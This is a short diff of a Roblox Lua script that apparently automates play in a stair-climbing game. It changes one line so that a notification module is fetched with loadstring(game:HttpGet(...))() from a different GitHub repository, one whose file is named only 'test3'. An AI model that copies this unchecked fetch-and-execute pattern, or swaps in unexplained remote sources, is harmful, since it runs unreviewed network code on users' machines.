@@ -11,7 +11,7 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 	})
 	
 local coordinates
-local notifs = loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua'))()
+local notifs = loadstring(game:HttpGet('https://raw.githubusercontent.com/GenesisPresent/test/main/test3'))()
 
 notifs.alert('Execute "_G.s = false" to stop!\nThis is the fastest it can go due to stairs being generated.', nil, 1000000, 'rainbow')
 task.wait(0.01)
